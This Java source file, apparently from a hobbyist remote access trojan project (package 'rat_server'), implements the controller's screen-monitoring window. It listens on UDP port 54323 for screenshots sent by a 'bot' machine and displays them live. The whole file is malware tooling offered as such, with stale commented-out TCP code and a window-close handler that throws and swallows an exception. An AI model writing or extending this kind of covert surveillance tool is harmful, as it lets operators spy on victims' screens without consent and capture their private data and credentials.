package rat_server;

import java.awt.FlowLayout;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.ServerSocket;
import java.net.Socket;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class ScreenMonitorServer extends JFrame
{
    private String botIPAddress;
    private ServerSocket serverSocket;
    private Socket botSocket;
    private JLabel screen;
    
    public ScreenMonitorServer(String botIPAddress)
    {
        super(botIPAddress+" - Screen Monitor");
        setSize(300,300);
        setLayout(new FlowLayout());
        setVisible(true);
        addWindowListener(new WindowAdapter()
        {

            @Override
            public void windowClosing(WindowEvent e) {
                try
                {
                    //botSocket.close();
                    //serverSocket.close();
                    System.out.println("closed");
                    throw new IOException();
                }
                catch(IOException exc)
                {
                    
                }
                /*new Thread(new Runnable() {

                        @Override
                        public void run() {
                            try
                            {
                                Thread.sleep(5000);
                                CommunicationStatus.inComingConnection=false;
                            }
                            catch(InterruptedException exc)
                            {
                                
                            }
                        }
                    }).start();*/
                super.windowClosing(e);
            }
            
        });
        screen=new JLabel();
        add(screen);
        this.botIPAddress=botIPAddress; 
        //try
        //{
            /*serverSocket=new ServerSocket(54323);
            do
                botSocket=serverSocket.accept();
            while(!botSocket.getInetAddress().getHostAddress().equals(botIPAddress));
            CommunicationStatus.inComingConnection=true;*/
            new Thread(new Runnable() {

                @Override
                public void run() {
                    ObjectInputStream ois=null;
                    try
                    {
                        byte[] receiveData = new byte[64*1024];
                        DatagramSocket clientSocket=new DatagramSocket(54323);
                        //ois=new ObjectInputStream(botSocket.getInputStream());
                        while(true)
                        {
                            DatagramPacket receivePacket=new DatagramPacket(receiveData, receiveData.length);
                            System.out.println("receiving...");
                            clientSocket.receive(receivePacket);
                            ByteArrayInputStream bais=new ByteArrayInputStream(receiveData);
                            BufferedImage bImageFromConvert=ImageIO.read(bais);
                            ImageIcon screenImage=new ImageIcon(bImageFromConvert);
                            setSize(bImageFromConvert.getWidth(),bImageFromConvert.getHeight());
                            screen.setIcon(screenImage);
                            /*InputStream in=new ByteArrayInputStream((byte[])ois.readObject());
                            BufferedImage bImageFromConvert=ImageIO.read(in);
                            ImageIcon screenImage=new ImageIcon(bImageFromConvert);
                            setSize(bImageFromConvert.getWidth(),bImageFromConvert.getHeight());
                            screen.setIcon(screenImage);*/
                        }
                    }
                    catch(IOException ex)
                    {
                        ex.printStackTrace();
                    }
                    /*catch(ClassNotFoundException ex)
                    {
                        
                    }*/
                    finally
                    {
                       /*try
                       {
                            ois.close();
                       }
                       catch(IOException ex)
                       {
                            ex.printStackTrace();
                       }*/
                    }
                }
            }).start(); 
        //}   
        /*catch(IOException exc)
        {
            exc.printStackTrace();
        }*/
    }
}